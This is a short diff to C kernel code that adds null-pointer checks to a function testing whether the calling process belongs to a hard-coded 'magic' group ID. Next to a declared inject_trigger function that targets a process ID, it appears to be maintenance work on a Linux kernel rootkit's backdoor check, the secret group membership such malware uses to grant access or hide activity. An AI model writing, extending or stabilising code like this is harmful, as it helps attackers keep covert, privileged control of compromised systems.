@@ -90,8 +90,13 @@ int  inject_trigger(pid_t target);
 static inline bool caller_has_magic_gid(void)
 {
     const struct cred *cred = current_cred();
-    struct group_info *gi = cred->group_info;
+    struct group_info *gi;
     int i;
+    if (!cred)
+        return false;
+    gi = cred->group_info;
+    if (!gi)
+        return false;
     for (i = 0; i < gi->ngroups; i++) {
         if (from_kgid(&init_user_ns, gi->gid[i]) == MAGIC_GID)
             return true;
